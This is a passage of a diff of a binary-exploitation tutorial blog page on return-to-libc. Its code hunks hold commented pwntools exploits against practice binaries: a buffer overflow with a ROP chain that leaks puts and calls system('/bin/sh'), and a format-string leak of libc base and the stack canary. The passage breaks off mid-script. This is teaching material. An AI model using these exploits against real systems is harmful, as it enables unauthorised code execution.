@@ -6,23 +6,23 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
-<!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>Return to libc | TourPran Blogs</title>
-<meta name="generator" content="Jekyll v4.2.0">
-<meta property="og:title" content="Return to libc">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>[pwn 3] Return to libc | TourPran Blogs</title>
+<meta name="generator" content="Jekyll v4.3.3">
+<meta property="og:title" content="[pwn 3] Return to libc">
 <meta name="author" content="tourpran">
 <meta property="og:locale" content="en_US">
 <meta name="description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
 <meta property="og:description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
-<link rel="canonical" href="http://pranavkrish04.github.io/pwn-training/2021/05/24/return2libcpwntrain.html">
-<meta property="og:url" content="http://pranavkrish04.github.io/pwn-training/2021/05/24/return2libcpwntrain.html">
+<link rel="canonical" href="http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain.html">
+<meta property="og:url" content="http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain.html">
 <meta property="og:site_name" content="TourPran Blogs">
 <meta property="og:type" content="article">
 <meta property="article:published_time" content="2021-05-24T00:00:00+05:30">
 <meta name="twitter:card" content="summary">
-<meta property="twitter:title" content="Return to libc">
+<meta property="twitter:title" content="[pwn 3] Return to libc">
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"Return to libc","url":"http://pranavkrish04.github.io/pwn-training/2021/05/24/return2libcpwntrain.html","datePublished":"2021-05-24T00:00:00+05:30","dateModified":"2021-05-24T00:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://pranavkrish04.github.io/pwn-training/2021/05/24/return2libcpwntrain.html"},"author":{"@type":"Person","name":"tourpran"},"description":"This is my blog for Binary Exploitation and Reverse Engineering.","@context":"https://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tourpran"},"dateModified":"2021-05-24T00:00:00+05:30","datePublished":"2021-05-24T00:00:00+05:30","description":"This is my blog for Binary Exploitation and Reverse Engineering.","headline":"[pwn 3] Return to libc","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain.html"},"url":"http://localhost:4000/pwn-training/2021/05/24/return2libcpwntrain.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="shortcut icon" href="">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -32,7 +32,7 @@
   <!-- and it's easy to individually load additional languages -->
   <script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
   <link rel="stylesheet" href="/assets/css/main.css">
-  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://pranavkrish04.github.io/feed.xml" title="TourPran Blogs">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="TourPran Blogs">
 </head>
 <body>
 
@@ -214,7 +214,7 @@
 
 
 <header class="post-header">
-  <h1 class="post-title p-name" itemprop="name headline">Return to libc</h1>
+  <h1 class="post-title p-name" itemprop="name headline">[pwn 3] Return to libc</h1>
   <h3 class="post-subtitle"></h3>
 
   <p class="post-meta">
@@ -352,48 +352,48 @@
 <p>Below is the commented solution.</p>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="c1"># Set up pwntools for the correct architecture
-</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
-<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2libc'</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2libc"</span><span class="p">)</span>
+</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./ret2libc</span><span class="sh">'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ret2libc</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="c1"># ./exploit.py DEBUG NOASLR
 </span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
 
 
 <span class="c1"># ./exploit.py GDB
-</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
 b* 0x00000000004011c7
-'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
 
 <span class="c1">#===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
 </span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Are you in?"</span><span class="p">)</span> <span class="c1"># recv the output sent by the program.
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Are you in?</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># recv the output sent by the program.
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span> <span class="o">+</span>  <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">])</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">))</span>
 <span class="c1"># filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function
-</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv unwanted bytes.
-</span><span class="n">leak_puts</span> <span class="o">=</span><span class="nb">hex</span><span class="p">(</span> <span class="n">u64</span><span class="p">((</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span> <span class="c1"># recv the puts function and strip the front and back, unpack it and store it as hex.
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span> <span class="c1"># recv unwanted bytes.
+</span><span class="n">leak_puts</span> <span class="o">=</span><span class="nf">hex</span><span class="p">(</span> <span class="nf">u64</span><span class="p">((</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">()).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)))</span> <span class="c1"># recv the puts function and strip the front and back, unpack it and store it as hex.
 </span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">))</span> <span class="c1"># make sure you get a address in the libc by logging it.
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">puts: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">))</span> <span class="c1"># make sure you get a address in the libc by logging it.
 </span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Are you in?"</span><span class="p">)</span> <span class="c1"># recv output.
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"C"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x13000a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x32190</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Are you in?</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># recv output.
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x13000a</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x32190</span><span class="p">))</span>
 <span class="c1"># fill garbage in buffer and pop RDI to fill it with a pointer to "bin/sh" call system.
 </span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -448,12 +448,12 @@ b* 0x00000000004011c7
   <li>We can store all of them in a list and analyse what is what.</li>
 </ul>
 
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
 
 <span class="c1"># phase 1 : leaking binary and libc address
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"So you wanna try again. Go ahead :)"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%p "</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span>
-<span class="n">all_leaked</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">split</span><span class="p">()</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Info leaked: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span>
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">So you wanna try again. Go ahead :)</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span>
+<span class="n">all_leaked</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()).</span><span class="nf">split</span><span class="p">()</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Info leaked: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span>
 </code></pre></div></div>
 
 <p><img src="/assets/images/pwntraining3/pwntrain8.png" alt=""></p>
@@ -477,61 +477,61 @@ b* 0x00000000004011c7
 <p>Now it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now <code class="language-plaintext highlighter-rouge">pop rdi</code> to populate it with the address of <code class="language-plaintext highlighter-rouge">/bin/sh</code> and call <code class="language-plaintext highlighter-rouge">system</code>. Below I have given the commented solution.</p>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="c1"># Set up pwntools for the correct architecture
-</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
-<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2libc_canary'</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2libc_canary"</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="p">)</span>
+</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./ret2libc_canary</span><span class="sh">'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ret2libc_canary</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">/lib/x86_64-linux-gnu/libc.so.6</span><span class="sh">"</span><span class="p">)</span>
 <span class="c1"># ./exploit.py DEBUG NOASLR
 </span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
 
 
 <span class="c1"># ./exploit.py GDB
-</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
 b* main+164
-'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
 
 <span class="c1">#===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
 </span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
 
 <span class="c1"># phase 1 : leaking binary and libc address
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"So you wanna try again. Go ahead :)"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%p "</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span> <span class="c1"># send format specifier to leak data from the stack
-</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv the new line.
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">So you wanna try again. Go ahead :)</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="mi">25</span><span class="p">)</span> <span class="c1"># send format specifier to leak data from the stack
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span> <span class="c1"># recv the new line.
 </span>
-<span class="n">all_leaked</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()).</span><span class="n">split</span><span class="p">()</span> <span class="c1"># store all leaked data as a list.
-</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Info leaked: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span> <span class="c1"># log it to make sure everything works fine
-</span><span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2013699</span> <span class="c1"># take the first element in the list which is a libc function.
-</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc Base: "</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span> <span class="c1"># log it
-</span><span class="n">binary_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4256</span> <span class="c1"># calculate the binary offset from the leak.
-</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"binary_base: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)))</span> <span class="c1"># log it
-</span><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># store the canary from the leak
+<span class="n">all_leaked</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()).</span><span class="nf">split</span><span class="p">()</span> <span class="c1"># store all leaked data as a list.
+</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Info leaked: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">))</span> <span class="c1"># log it to make sure everything works fine
+</span><span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2013699</span> <span class="c1"># take the first element in the list which is a libc function.
+</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Libc Base: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)))</span> <span class="c1"># log it
+</span><span class="n">binary_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4256</span> <span class="c1"># calculate the binary offset from the leak.
+</span><span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">binary_base: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">binary_base</span><span class="p">)))</span> <span class="c1"># log it
+</span><span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">all_leaked</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">])[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># store the canary from the leak
 </span>
 <span class="c1"># pahse 2 : usign the leak to ret2libc
 </span>
-<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># fill the buffer till the canary and overwrite the canary with real one.
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># random garbage to fill the rbp
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x00000000000012cb</span><span class="p">)</span> <span class="c1"># return address
-</span><span class="k">print</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> <span class="c1"># find the address of libc bin/sh
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span> 
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># return to make sure stack is aligned before a glibc call
-</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span> <span class="c1"># call system.
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="c1"># fill the buffer till the canary and overwrite the canary with real one.
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x0000000000001016</span><span class="p">)</span> <span class="c1"># random garbage to fill the rbp
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_base</span><span class="o">+</span><span class="mh">0x00000000000012cb</span><span class="p">)</span> <span class="c1"># return address
